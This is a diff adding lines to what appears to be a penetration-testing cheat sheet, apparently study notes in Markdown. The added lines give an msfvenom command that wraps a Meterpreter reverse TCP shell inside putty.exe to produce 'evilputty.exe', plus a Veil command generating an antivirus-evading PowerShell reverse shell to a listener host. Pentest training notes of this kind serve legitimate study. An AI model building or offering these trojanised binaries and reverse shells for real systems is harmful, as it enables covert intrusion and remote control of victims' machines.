@@ -2654,6 +2654,16 @@ sudo apt install wine
 sudo apt install wine32
 shellter
 ```
+Or with msfvenom
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.192 LPORT=4444 -f exe -i 25 -k -x putty.exe  > evilputty.exe
+```
+## Veil
+[Veil](https://github.com/Veil-Framework/Veil) is a tool designed to generate metasploit payloads that bypass common anti-virus solutions.
+Install it with ``apt``
+```
+/usr/share/veil/Veil-py -t Evasion -p powershell/meterpreter/rev_tcp.py --ip 10.10.10.10 --port 4444
+```
 
 # Port Redirection and Tunneling
 ## Local Port Forwarding
